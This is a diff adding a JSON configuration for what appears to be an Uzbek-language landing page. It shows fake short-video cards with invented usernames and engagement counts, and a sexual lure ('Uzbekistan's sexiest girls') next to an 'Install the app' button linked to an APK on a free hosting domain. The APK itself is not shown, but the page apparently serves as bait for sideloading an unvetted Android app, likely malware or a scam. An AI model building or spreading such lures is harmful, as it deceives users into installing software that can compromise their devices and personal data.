@@ -1,0 +1,86 @@
+{
+  "apkUrl": "https://uzbekistan-info.vercel.app/docs/sxUZ.apk",
+  "thankYouUrl": "/thankyou2.html",
+  "videos": [
+    {
+      "id": 1,
+      "author": "@aylin.uz",
+      "avatar": "👤",
+      "title": "Eng soʻnggi trendlar",
+      "likes": 1234,
+      "comments": 567,
+      "shares": 234,
+      "image": "https://tse2.mm.bing.net/th/id/OIP.4ielnp5TTWyQB-gIoMi3OAHaIx?w=144&h=180&c=7&r=0&o=5&cb=ucfimg2&dpr=1.3&pid=1.7&ucfimg=1"
+    },
+    {
+      "id": 2,
+      "author": "@dina.kz",
+      "avatar": "👩",
+      "title": "Ajoyib xareketlar",
+      "likes": 5678,
+      "comments": 1234,
+      "shares": 456,
+      "image": "https://tse1.mm.bing.net/th/id/OIP.JwNDrnkFbDW0Xp8YTzPl0wHaLJ?w=203&h=306&c=7&r=0&o=5&cb=ucfimg2&dpr=1.3&pid=1.7&ucfimg=1"
+    },
+    {
+      "id": 3,
+      "author": "@zoya_star",
+      "avatar": "✨",
+      "title": "Yana bir video",
+      "likes": 9999,
+      "comments": 2345,
+      "shares": 789,
+      "image": "https://tse1.mm.bing.net/th/id/OIP.IrJLFY8GN3qToCogSbAySgHaJQ?w=208&h=260&c=7&r=0&o=5&cb=ucfimg2&dpr=1.3&pid=1.7&ucfimg=1"
+    },
+    {
+      "id": 4,
+      "author": "@marina.uz",
+      "avatar": "👩",
+      "title": "Yangi kontent",
+      "likes": 3456,
+      "comments": 890,
+      "shares": 345,
+      "image": "https://tse2.mm.bing.net/th/id/OIP.K5n22tazTXFR0VZ1r3uNJwHaJO?w=208&h=258&c=7&r=0&o=5&cb=ucfimg2&dpr=1.3&pid=1.7&ucfimg=1"
+    },
+    {
+      "id": 5,
+      "author": "@saiora.uz",
+      "avatar": "🎵",
+      "title": "Musiqali trendlar",
+      "likes": 7890,
+      "comments": 1567,
+      "shares": 567,
+      "image": "https://tse3.mm.bing.net/th/id/OIP.pOoV4NCgaFcfOb17tW5DxgHaHa?w=208&h=208&c=7&r=0&o=5&cb=ucfimg2&dpr=1.3&pid=1.7&ucfimg=1"
+    },
+    {
+      "id": 6,
+      "author": "@ekaterina_beauty",
+      "avatar": "👤",
+      "title": "Eng yangi content",
+      "likes": 4567,
+      "comments": 1123,
+      "shares": 456,
+      "image": "https://tse2.mm.bing.net/th/id/OIP.UseftiZhy_INsCNSsQBqgQHaJ3?w=208&h=277&c=7&r=0&o=5&cb=ucfimg2&dpr=1.3&pid=1.7&ucfimg=1"
+    }
+  ],
+  "texts": {
+    "logo": "SXUz",
+    "description": "Faqat shu yerda siz Oʻzbekistonning eng sexy qizlarini topasiz",
+    "features": [
+      {
+        "icon": "📱",
+        "text": "Vertikal kontentning kutub lentasi"
+      },
+      {
+        "icon": "⚡",
+        "text": "Tezkor video yuklash"
+      },
+      {
+        "icon": "❤️",
+        "text": "Interaktiv xususiyatlar"
+      }
+    ],
+    "button": "📥 Ilovani oʻrnatish"
+  }
+}
+
